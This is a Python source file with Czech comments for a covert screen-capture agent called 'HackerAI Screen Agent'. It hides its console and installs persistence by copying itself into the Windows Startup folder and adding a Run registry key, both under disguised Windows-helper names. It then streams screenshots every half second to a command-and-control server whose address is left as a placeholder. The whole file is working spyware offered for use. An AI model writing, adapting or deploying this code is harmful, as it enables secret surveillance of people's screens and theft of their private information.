#!/usr/bin/env python3
"""
HackerAI Screen Agent - tajný screen sharing s perzistencí.
Posílá screenshoty na C2 server a přidá se do startup složky Windows.
"""
import os
import sys
import time
import struct
import socket
import shutil
import tempfile
import subprocess
import platform
from io import BytesIO

# ================ KONFIGURACE ================
C2_HOST = "IPv4"   # TVUJ_IP_SERVERU ← ZMĚŇ!!!
C2_PORT = 4443
INTERVAL = 0.5              # screenshot každých 0.5s (2 FPS)
QUALITY = 75                # JPEG kvalita (1-100, nižší = menší data)
STARTUP_NAME = "WindowsSysHelper.exe"
# =============================================


def get_startup_path():
    """Vrátí cestu k Windows startup složce."""
    if platform.system() != "Windows":
        return None
    import winreg
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"
        ) as key:
            startup = winreg.QueryValueEx(key, "Startup")[0]
            return startup
    except WindowsError:
        # Fallback - běžná cesta
        return os.path.join(
            os.environ.get("APPDATA", ""),
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )


def install_persistence():
    """
    Nainstaluje perzistenci:
    1. Zkopíruje se do startup složky
    2. Přidá registry Run key jako zálohu
    """
    if platform.system() != "Windows":
        return False
    
    try:
        # Cesta k aktuálnímu executable
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(sys.argv[0])
        
        # 1. Startup složka
        startup_dir = get_startup_path()
        if startup_dir and os.path.isdir(startup_dir):
            dest = os.path.join(startup_dir, STARTUP_NAME)
            if os.path.abspath(exe_path) != dest:
                try:
                    shutil.copy2(exe_path, dest)
                    print(f"[+] Copied to startup: {dest}")
                except Exception as e:
                    print(f"[-] Startup copy failed: {e}")
        
        # 2. Registry Run key (záloha)
        import winreg
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "WindowsUpdateHelper", 0, winreg.REG_SZ, exe_path)
                print(f"[+] Registry Run key set")
        except Exception as e:
            print(f"[-] Registry set failed: {e}")
        
        return True
    except Exception as e:
        print(f"[-] Persistence failed: {e}")
        return False


def hide_console():
    """Skryje konzoli na Windows (při spuštění pythonw.exe nebo jako .exe)."""
    if platform.system() != "Windows":
        return
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass


def take_screenshot():
    """
    Pořídí screenshot pomocí MSS (rychlé, bez dependency).
    Fallback na PIL pokud MSS není k dispozici.
    """
    try:
        from mss import mss
        with mss() as sct:
            monitor = sct.monitors[1]  # Hlavní monitor
            sct_img = sct.grab(monitor)
            from PIL import Image
            img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)
    except ImportError:
        try:
            from PIL import ImageGrab
            img = ImageGrab.grab(all_screens=True)
        except ImportError:
            print("[-] Need either 'mss' or 'Pillow' for screenshots")
            return None
    
    # Komprimace na JPEG v paměti
    buf = BytesIO()
    img.save(buf, format="JPEG", quality=QUALITY, optimize=True)
    return buf.getvalue()


def send_frame(sock, frame_data):
    """Pošle frame po TCP s 4-bajtovou délkou prefixem."""
    msg = struct.pack("!I", len(frame_data)) + frame_data
    sock.sendall(msg)


def connect_and_stream():
    """Hlavní smyčka - připojení na C2 a streamování screenu."""
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((C2_HOST, C2_PORT))
            print(f"[+] Connected to {C2_HOST}:{C2_PORT}")
            sock.settimeout(None)
            
            while True:
                frame = take_screenshot()
                if frame:
                    try:
                        send_frame(sock, frame)
                    except (ConnectionResetError, BrokenPipeError, OSError):
                        print("[-] Connection lost, reconnecting...")
                        break
                time.sleep(INTERVAL)
                
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            print(f"[-] Connection failed ({e}), retrying in 5s...")
            time.sleep(5)
        except KeyboardInterrupt:
            print("\n[!] Agent stopped by user")
            sys.exit(0)
        finally:
            try:
                sock.close()
            except:
                pass


def main():
    # Skryjeme konzoli (při spuštění jako pythonw.exe nebo .exe)
    hide_console()
    
    # Perzistence (jen při prvním spuštění)
    if "--install" in sys.argv:
        install_persistence()
        print("[+] Persistence installed")
        return
    
    # Automatická instalace perzistence při normálním spuštění
    install_persistence()
    
    # Hlavní smyčka - streamování
    connect_and_stream()


if __name__ == "__main__":
    main()
